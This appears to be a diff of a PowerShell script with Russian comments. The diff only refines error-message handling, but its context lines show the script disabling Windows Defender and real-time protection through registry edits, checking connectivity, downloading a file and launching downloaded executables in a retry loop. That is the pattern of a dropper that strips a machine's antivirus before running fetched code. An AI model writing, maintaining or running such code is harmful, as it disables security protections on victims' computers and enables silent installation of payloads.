@@ -48,7 +48,7 @@ try {
     Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force -ErrorAction Stop
     Write-Host "✓ Windows Defender disabled (reboot may be required)" -ForegroundColor Green
 } catch {
-    Write-Host "✗ Failed to set Defender registry values: $_" -ForegroundColor Red
+    Write-Host "✗ Failed to set Defender registry values: $($_.Exception.Message)" -ForegroundColor Red
 }
 
 # Отключаем Real-Time Protection
@@ -153,7 +153,7 @@ try {
         Write-Host "! Internet connection unstable" -ForegroundColor DarkYellow
     }
 } catch {
-    Write-Host "! Internet check failed: $_" -ForegroundColor DarkYellow
+    Write-Host "! Internet check failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
 }
 
 # Скачивание первого файла
@@ -200,16 +200,12 @@ function Start-FileWithRetry {
         
         # Проверяем, является ли файл исполняемым
         try {
-            # Пытаемся получить информацию о файле
-            $fileInfo = Get-Item $filePath
-            Write-Host "Starting: $description" -ForegroundColor Green
-            
             # Запускаем процесс
             $process = Start-Process -FilePath $filePath -WindowStyle Normal -PassThru
             Write-Host "✓ $description started (PID: $($process.Id))" -ForegroundColor Green
             return $true
         } catch {
-            Write-Host "✗ Failed to start $description: $_" -ForegroundColor Red
+            Write-Host "✗ Failed to start $description: $($_.Exception.Message)" -ForegroundColor Red
             return $false
         }
     } else {
